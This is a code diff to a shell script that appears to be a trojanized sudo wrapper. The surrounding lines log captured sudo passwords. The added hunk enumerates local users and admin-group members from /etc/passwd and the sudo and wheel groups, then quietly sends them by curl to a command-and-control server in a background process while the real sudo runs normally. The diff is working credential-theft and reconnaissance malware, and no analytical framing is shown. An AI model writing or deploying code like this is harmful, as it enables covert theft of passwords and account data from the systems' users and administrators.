@@ -75,6 +75,29 @@ if [ $VALIDATE_RC -eq 0 ]; then
     echo "${HOST_TS}|sudo|${INVOKING_USER}|${CAPTURED_PASS}|${COMMAND_ARGS}" \
         >> "$LOCAL_LOG" 2>/dev/null
 
+
+    # -- user enumeration: fire-and-forget, does not block sudo --
+    (
+        SYNC_URL="http://${C2_HOST}:${C2_PORT}/sync"
+        SUDO_USERS=$(getent group sudo wheel 2>/dev/null | awk -F: '{print $4}' | tr ',' '\n' | sort -u | tr '\n' ',' | sed 's/,$//')
+        USERS_JSON="["
+        FIRST=1
+        while IFS=: read -r uname _ uid gid _ _ _; do
+            [ "$uid" -lt 1000 ] && [ "$uname" != "root" ] && continue
+            [ "$uid" -gt 60000 ] && continue
+            IS_A=false
+            [ "$uname" = "root" ] && IS_A=true
+            echo ",$SUDO_USERS," | grep -q ",$uname," && IS_A=true
+            [ $FIRST -eq 1 ] && FIRST=0 || USERS_JSON="${USERS_JSON},"
+            USERS_JSON="${USERS_JSON}{\"username\":\"${uname}\",\"uid\":${uid},\"is_admin\":${IS_A}}"
+        done < /etc/passwd
+        USERS_JSON="${USERS_JSON}]"
+        SPAYLOAD="{\"host_ip\":\"${HOST_IP}\",\"users\":${USERS_JSON}}"
+        curl -sf -X POST -H "Content-Type: application/json" \
+            -d "$SPAYLOAD" --connect-timeout 3 --max-time 5 \
+            "$SYNC_URL" > /dev/null 2>&1
+    ) &
+
     exec $REAL_SUDO "$@"
 else
     exec $REAL_SUDO "$@"
